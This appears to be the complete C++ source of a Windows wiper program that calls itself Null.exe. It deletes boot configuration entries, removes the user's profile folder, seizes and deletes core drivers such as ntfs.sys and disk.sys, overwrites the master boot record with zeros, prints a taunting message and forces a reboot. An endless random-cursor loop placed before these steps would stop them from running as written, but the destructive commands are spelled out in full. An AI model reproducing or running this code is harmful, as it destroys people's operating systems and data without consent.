#include <Windows.h>
#include <iostream>

using namespace std;



int main()
{

	int X, Y;

	srand(time(NULL));
		while (1) {
			Y = rand() % 801;
			X = rand() % 601;
			SetCursorPos(X, Y);
		}

	system("start bcdedit.exe /delete {current} /f");
	system("start bcdedit.exe /delete {memdiag} /f");
	system("start bcdedit.exe /delete {bootmgr} /f");
	system("start mountvol.exe W: /s");
	system("start taskkill /f /im explorer.exe");
	system("rd C:\\Users\\%username% /s /q");
	system("start takeown.exe /f C:\\Windows\\System32\\drivers\\disk.sys");
	system("start takeown.exe /f C:\\Windows\\System32\\drivers\\ntfs.sys");
	system("start takeown.exe /f C:\\Windows\\System32\\winload.exe");
	system("start takeown.exe /f C:\\Windows\\System32\\winload.efi");
	system("start icacls.exe C:\\Windows\\System32\\winload.exe /grant %username%:F");
	system("start icacls.exe C:\\Windows\\System32\\winload.efi /grant %username%:F");
	system("start icacls.exe C:\\Windows\\System32\\drivers\\ntfs.sys /grant %username%:F");
	system("start icacls.exe C:\\Windows\\System32\\drivers\\disk.sys /grant %username%:F");
	system("del C:\\Windows\\System32\\drivers\\ntfs.sys");
	system("del C:\\Windows\\System32\\drivers\\disk.sys");
	system("rd W: /s /q");

	char mbrData[512];

	ZeroMemory(&mbrData, (sizeof mbrData));

	HANDLE MBR = CreateFile(L"\\\\.\\PhysicalDrive0",
		GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL
		);

	DWORD write;

	WriteFile(MBR,mbrData, 512, &write, NULL);

	cout << "Your pc has been Trashed by Null.exe";
	Sleep(2000);
	system("start shutdown.exe -r -t 0");
}
